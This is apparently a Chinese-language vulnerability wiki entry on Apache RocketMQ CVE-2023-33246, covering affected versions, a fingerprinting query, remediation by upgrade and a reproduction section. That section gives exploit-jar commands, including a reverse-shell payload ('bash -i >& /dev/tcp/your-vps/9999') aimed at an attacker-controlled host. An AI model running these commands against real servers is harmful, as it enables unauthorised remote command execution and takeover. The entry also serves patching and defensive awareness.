# Apache RocketMQ RCE 漏洞 CVE-2023-33246

## 漏洞描述

RocketMQ 是阿里巴巴在2012年开发的分布式消息中间件，专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。

RocketMQ 5.1.0 及以下版本，在一定条件下存在远程命令执行风险。RocketMQ 的 NameServer、Broker、Controller 等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以 RocketMQ 运行的系统用户身份执行命令。此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。

## 漏洞影响

```
Apache RocketMQ <= 5.1.0
Apache RocketMQ <= 4.9.5
```

## 网络测绘

```
title="RocketMQ"
```

## 漏洞复现

poc：

```
java -jar CVE-2023-33246.jar -ip "target-ip" -cmd "command"
```

反弹 shell：

```
java -jar CVE-2023-33246.jar -ip "target-ip" -cmd "bash -i >& /dev/tcp/your-vps/9999 0>&1"
```

## 修复建议

目前官方已发布安全修复更新，受影响用户可以升级到Apache RocketMQ 5.1.1或者4.9.6。

链接：https://rocketmq.apache.org/download/
